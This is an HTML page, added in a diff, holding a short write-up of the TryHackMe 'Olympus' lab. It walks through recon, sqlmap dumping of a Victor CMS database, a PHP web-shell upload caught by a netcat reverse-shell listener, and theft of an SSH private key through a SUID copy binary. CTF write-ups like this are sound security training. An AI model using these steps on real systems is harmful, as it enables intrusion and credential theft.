@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <link href="https://fonts.googleapis.com/css2?family=Raleway:wght@400;700&display=swap" rel="stylesheet">
+   <link rel="stylesheet" href="../../../../assets/css/articles.css">
+   <link rel="icon" type="image/png" href="/img/home/favicon.png" />
+   <title>olympus.</title>
+</head>
+
+<body>
+    <header class="header">
+        <nav class="breadcrumb">
+            <a href="/index-en.html">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                    stroke-linejoin="round">
+                    <path d="M19 12H5M12 19l-7-7 7-7" />
+                </svg>
+                Back
+            </a>
+        </nav>
+        <div class="header-controls">
+            <div class="language-toggle">
+                <a href="../../../pt-br/writeups/tryhackme/olympus.html" title="Português (Brasil)">
+                    <svg viewBox="0 0 72 48" xmlns="http://www.w3.org/2000/svg">
+                        <rect width="72" height="48" fill="#009c3b" />
+                        <polygon points="36,4 68,24 36,44 4,24" fill="#ffdf00" />
+                        <circle cx="36" cy="24" r="12" fill="#002776" />
+                        <path d="M24.5,21 Q36,28 47.5,21" stroke="#fff" stroke-width="2.5" fill="none" />
+                        <circle cx="30" cy="28" r="0.6" fill="#fff" />
+                        <circle cx="33" cy="30" r="0.5" fill="#fff" />
+                        <circle cx="36" cy="31" r="0.6" fill="#fff" />
+                        <circle cx="39" cy="30" r="0.5" fill="#fff" />
+                        <circle cx="42" cy="28" r="0.6" fill="#fff" />
+                    </svg>
+                </a>
+                <a href="../../../en-us/writeups/tryhackme/olympus.html" class="active" title="English (US)">
+                    <svg viewBox="0 0 36 24" xmlns="http://www.w3.org/2000/svg">
+                        <rect width="36" height="24" fill="#fff" />
+                        <rect width="36" height="1.85" y="0" fill="#b22234" />
+                        <rect width="36" height="1.85" y="3.7" fill="#b22234" />
+                        <rect width="36" height="1.85" y="7.4" fill="#b22234" />
+                        <rect width="36" height="1.85" y="11.1" fill="#b22234" />
+                        <rect width="36" height="1.85" y="14.8" fill="#b22234" />
+                        <rect width="36" height="1.85" y="18.5" fill="#b22234" />
+                        <rect width="36" height="1.85" y="22.2" fill="#b22234" />
+                        <rect width="14.4" height="12.95" fill="#3c3b6e" />
+                    </svg>
+                </a>
+            </div>
+        </div>
+    </header>
+   <main class="content">
+      <header class="article-header">
+         <h1>Olympus</h1>
+         <p class="meta">
+            TryHackMe &middot; Medium by <a href="https://www.linkedin.com/in/brennocm/">Brenno M.</a>
+         </p>
+      </header>
+      <section class="article-body writeup-body">
+         <p>Olympus exploits a <b>SQL Injection</b> in Victor CMS to extract credentials, finds a subdomain chat that allows a <b>web shell upload</b>, and escalates via a <b>SUID binary</b> that copies files, ending at root through an SSH key and a privesc script.</p>
+
+         <figure class="attack-flow">
+            <figcaption>Attack path</figcaption>
+            <svg viewBox="0 0 660 176" role="img" aria-label="Attack path" xmlns="http://www.w3.org/2000/svg"><line x1="24" y1="32.0" x2="24" y2="52.0" stroke="#5c7a12" stroke-width="2"/><line x1="24" y1="78.0" x2="24" y2="98.0" stroke="#5c7a12" stroke-width="2"/><line x1="24" y1="124.0" x2="24" y2="144.0" stroke="#5c7a12" stroke-width="2"/><circle cx="24" cy="19.0" r="13" fill="#16200a" stroke="#9fef00" stroke-width="2"/><text x="24" y="19.0" fill="#9fef00" font-size="12" font-weight="700" text-anchor="middle" dominant-baseline="central">1</text><text fill="#e4e4e4" font-size="15" font-weight="600" dominant-baseline="central"><tspan x="54" y="19.0">Reconnaissance</tspan></text><circle cx="24" cy="65.0" r="13" fill="#16200a" stroke="#9fef00" stroke-width="2"/><text x="24" y="65.0" fill="#9fef00" font-size="12" font-weight="700" text-anchor="middle" dominant-baseline="central">2</text><text fill="#e4e4e4" font-size="15" font-weight="600" dominant-baseline="central"><tspan x="54" y="65.0">SQL Injection</tspan></text><circle cx="24" cy="111.0" r="13" fill="#16200a" stroke="#9fef00" stroke-width="2"/><text x="24" y="111.0" fill="#9fef00" font-size="12" font-weight="700" text-anchor="middle" dominant-baseline="central">3</text><text fill="#e4e4e4" font-size="15" font-weight="600" dominant-baseline="central"><tspan x="54" y="111.0">Foothold - upload</tspan></text><circle cx="24" cy="157.0" r="13" fill="#16200a" stroke="#9fef00" stroke-width="2"/><text x="24" y="157.0" fill="#9fef00" font-size="12" font-weight="700" text-anchor="middle" dominant-baseline="central">4</text><text fill="#e4e4e4" font-size="15" font-weight="600" dominant-baseline="central"><tspan x="54" y="157.0">Privilege escalation</tspan></text></svg>
+         </figure>
+
+         <h2>Reconnaissance</h2>
+
+         <p>Nmap reveals SSH and HTTP. Enumeration finds the <i>~webmaster</i> directory (Victor CMS) and a subdomain <i>chat.olympus.thm</i>.</p>
+
+         <pre class="code-block"><code>nmap -sS -sV -Pn &lt;IP&gt;
+echo &#x27;&lt;IP&gt; olympus.thm chat.olympus.thm&#x27; | sudo tee -a /etc/hosts
+gobuster dir -u http://olympus.thm/~webmaster/ -w big.txt</code></pre>
+
+         <h2>SQL Injection</h2>
+
+         <p>Victor CMS's search feature is vulnerable to SQLi. With <b>sqlmap</b> we dump the database, revealing users (prometheus, zeus) and pointing at the chat.</p>
+
+         <pre class="code-block"><code>sqlmap -r search.req --dbs
+sqlmap -r search.req -D olympus --dump</code></pre>
+
+         <h2>Foothold - upload</h2>
+
+         <p>In the authenticated chat, upload a PHP web shell (the uploaded filename is stored in the <i>chats</i> table) and trigger the reverse shell.</p>
+
+         <pre class="code-block"><code># upload shell.php via chat -&gt; get file path
+curl http://.../uploads/&lt;file&gt;.php
+nc -lvnp 4444</code></pre>
+
+         <h2>Privilege escalation</h2>
+
+         <p>We find a <i>zeus</i>-SUID binary that copies files; use it to copy zeus's <i>id_rsa</i> and log in over SSH. A privesc PHP script, executed as instructed, yields root.</p>
+
+         <pre class="code-block"><code>find / -perm -4000 2&gt;/dev/null
+# SUID binary (zeus) -&gt; copy /home/zeus/.ssh/id_rsa
+ssh -i id_rsa zeus@&lt;IP&gt;
+# run the indicated privesc PHP script -&gt; root
+cat /root/root.txt</code></pre>
+      </section>
+   </main>
+   <br>
+   <footer>
+      <p>&copy; 20∞</p>
+   </footer>
+    <script src="../../../../assets/js/article-toc.js" defer></script>
+</body>
+
+</html>
